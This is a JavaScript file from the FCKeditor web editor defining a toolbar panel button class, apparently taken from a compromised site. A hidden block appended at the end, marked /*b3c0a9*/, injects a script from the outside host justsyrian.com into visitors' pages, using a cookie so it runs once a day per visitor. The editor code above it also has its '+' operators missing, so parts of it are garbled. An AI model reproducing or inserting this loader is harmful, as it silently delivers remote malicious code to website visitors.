/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcktoolbarpanelbutton.js
 * 	FCKToolbarPanelButton Class: represents a special button in the toolbar
 * 	that shows a panel when pressed.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKToolbarPanelButton = function( commandName, label, tooltip, style )
{
	this.Command	= FCKCommands.GetCommand( commandName ) ;
	this.Label		= label ? label : commandName ;
	this.Tooltip	= tooltip ? tooltip : ( label ? label : commandName) ;
	this.Style		= style ? style : FCK_TOOLBARITEM_ONLYICON ;
	this.State		= FCK_UNKNOWN ;
	this.IconPath	= FCKConfig.SkinPath   'toolbar/'   commandName.toLowerCase()   '.gif' ;
}

FCKToolbarPanelButton.prototype.Click = function(e)
{
	// For Mozilla we must stop the event propagation to avoid it hiding 
	// the panel because of a click outside of it.
//	if ( e )
//	{
//		e.stopPropagation() ;
//		FCKPanelEventHandlers.OnDocumentClick( e ) ;
//	}

	if ( this.State != FCK_TRISTATE_DISABLED )
	{
		this.Command.Execute(0, this.DOMDiv.offsetHeight, this.DOMDiv) ;
//			this.FCKToolbarButton.HandleOnClick( this, e ) ;
	}
		
	return false ;
}

FCKToolbarPanelButton.prototype.CreateInstance = function( parentToolbar )
{
	this.DOMDiv = document.createElement( 'div' ) ;
	this.DOMDiv.className = 'TB_Button_Off' ;

	this.DOMDiv.FCKToolbarButton = this ;
	
	var sHtml =
		'<table title="'   this.Tooltip   '" cellspacing="0" cellpadding="0" border="0">'  
			'<tr>' ;
			
	if ( this.Style != FCK_TOOLBARITEM_ONLYTEXT ) 
		sHtml  = '<td class="TB_Icon"><img src="'   this.IconPath   '" width="21" height="21"></td>' ;
		
	if ( this.Style != FCK_TOOLBARITEM_ONLYICON ) 
		sHtml  = '<td class="TB_Text" nowrap>'   this.Label   '</td>' ;
	
	sHtml  =
				'<td class="TB_ButtonArrow"><img src="'   FCKConfig.SkinPath   'images/toolbar.buttonarrow.gif" width="5" height="3"></td>'  
			'</tr>'  
		'</table>' ;
	
	this.DOMDiv.innerHTML = sHtml ;

	var oCell = parentToolbar.DOMRow.insertCell(-1) ;
	oCell.appendChild( this.DOMDiv ) ;
	
	this.RefreshState() ;
}

// The Panel Button works like a normal button so the refresh state functions
// defined for the normal button can be reused here.
FCKToolbarPanelButton.prototype.RefreshState	= FCKToolbarButton.prototype.RefreshState ;
FCKToolbarPanelButton.prototype.Enable			= FCKToolbarButton.prototype.Enable ;
FCKToolbarPanelButton.prototype.Disable			= FCKToolbarButton.prototype.Disable ;

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
